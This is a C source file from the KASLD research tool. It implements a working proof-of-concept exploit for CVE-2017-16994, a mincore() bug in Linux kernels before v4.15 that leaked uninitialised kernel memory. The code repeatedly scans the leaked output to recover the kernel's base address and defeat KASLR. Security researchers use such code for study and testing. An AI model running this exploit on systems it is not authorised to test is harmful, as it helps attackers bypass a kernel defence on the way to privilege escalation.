// This file is part of KASLD - https://github.com/bcoles/kasld
//
// mincore heap page disclosure (CVE-2017-16994)
//
// The `mincore` syscall copies uninitialized memory
// from the page allocator to userspace.
//
// Patched in kernel v4.15-rc1 on 2017-11-16:
// https://github.com/torvalds/linux/commit/373c4557d2aa362702c4c2d41288fb1e54990b7c
//
// Largely based on original code by Jann Horn:
// https://bugs.chromium.org/p/project-zero/issues/detail?id=1431
//
// Leak primitive:
//   Data leaked:      kernel heap pointer (page allocator metadata)
//   Kernel subsystem: mm — mincore syscall (do_mincore /
//   __mincore_unmapped_range) Data structure:   page allocator metadata
//   (uninitialized byte in vec) Address type:     virtual Method: heuristic
//   (brute-force scan of MAP_HUGETLB region) CVE:              CVE-2017-16994
//   Patched:          v4.15 (commit 373c4557d2aa)
//   Status:           fixed in v4.15
//   Access check:     none pre-v4.15 (mincore syscall, unprivileged)
//   Source: https://elixir.bootlin.com/linux/v4.14/source/mm/mincore.c
//
// Mitigations:
//   Patched in v4.15. No runtime sysctl could restrict access — the
//   bug was an uninitialized byte in the mincore output vector. x86_64 only.
// ---
// <bcoles@gmail.com>

#if !defined(__x86_64__) && !defined(__amd64__)
#error "Architecture is not supported"
#endif

#define _GNU_SOURCE
#include "include/kasld/api.h"
#include "include/kasld/cli.h"
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>

/* Time limit (seconds) to avoid grinding on patched kernels.
 * On vulnerable systems the leak is typically found within the first
 * few thousand iterations, so this limit only fires on patched kernels
 * where every iteration is fruitless. */
#define TIMEOUT_SECS 5

KASLD_EXPLAIN(
    "Exploits CVE-2017-16994: the mincore() syscall, when querying "
    "unbacked MAP_NORESERVE MAP_HUGETLB pages, left the output vector "
    "uninitialised, leaking kernel slab data (including heap pointers "
    "from the buddy allocator) to userspace. Fixed in v4.15 by zeroing "
    "the output vector for unmapped huge-page ranges.");

KASLD_META("method:heuristic\n"
           "phase:probing\n"
           "addr:virtual\n"
           "cve:CVE-2017-16994\n"
           "patch:v4.15\n");

static unsigned long get_kernel_addr_mincore(void) {
  /* Heap-allocate the page_sized cookie buffer: the runtime size from
   * getpagesize() would otherwise require a VLA, which conflicts with
   * -Wvla and pessimises -fstack-protector-strong on this frame. */
  size_t page = (size_t)getpagesize();
  unsigned char *buf = malloc(page);
  if (!buf)
    return 0;
  unsigned long iterations = 1000000;
  unsigned long addr = 0;
  unsigned long len = (unsigned long)0x20000000000;

  /* A MAP_ANONYMOUS | MAP_HUGETLB mapping */
  if (mmap((void *)0x66000000, len, PROT_NONE,
           MAP_SHARED | MAP_ANONYMOUS | MAP_HUGETLB | MAP_NORESERVE, -1,
           0) == MAP_FAILED) {
    perror("[-] mmap");
    free(buf);
    return 0;
  }

  unsigned long i;
  /* -t SECS overrides the default give-up budget: on a vulnerable kernel the
   * leak is found in a few thousand iterations, but on a patched one this scan
   * runs to the deadline before concluding "likely patched". */
  int budget_s = kasld_time_s > 0 ? (int)kasld_time_s : TIMEOUT_SECS;
  struct timespec deadline;
  clock_gettime(CLOCK_MONOTONIC, &deadline);
  deadline.tv_sec += budget_s;

  for (i = 0; i <= iterations; i++) {
    /* Check deadline every 4096 iterations to avoid clock_gettime overhead */
    if ((i & 0xfff) == 0 && i > 0) {
      struct timespec now;
      clock_gettime(CLOCK_MONOTONIC, &now);
      if (now.tv_sec > deadline.tv_sec ||
          (now.tv_sec == deadline.tv_sec && now.tv_nsec >= deadline.tv_nsec)) {
        kasld_err("timeout after %lu iterations (%ds); likely patched", i,
                  budget_s);
        break;
      }
    }
    /* Touch a mishandle with this type mapping */
    if (mincore((void *)0x86000000, 0x1000000, buf)) {
      perror("[-] mincore");
      free(buf);
      return 0;
    }

    unsigned long n;
    for (n = 0; n < page / sizeof(unsigned char); n++) {
      addr = *(unsigned long *)(&buf[n]);
      /* Kernel address space */
      if (kasld_addr_is_kernel_text(addr)) {
        if (munmap((void *)0x66000000, len))
          perror("[-] munmap");
        free(buf);
        return addr;
      }
    }
  }

  if (munmap((void *)0x66000000, len))
    perror("[-] munmap");

  free(buf);
  kasld_err("kernel base not found in mincore info leak");
  return 0;
}

int main(int argc, char *argv[]) {
  kasld_cli(argc, argv);
  kasld_info("trying mincore info leak...");

  unsigned long addr = get_kernel_addr_mincore();
  if (!addr)
    return 0;

  printf("leaked address: %lx\n", addr);
  printf("possible kernel base: %lx\n", kasld_floor_text_base(addr));
  kasld_result_sample(KASLD_TYPE_VIRT, REGION_KERNEL_TEXT, addr, NULL,
                      CONF_HEURISTIC);

  return 0;
}
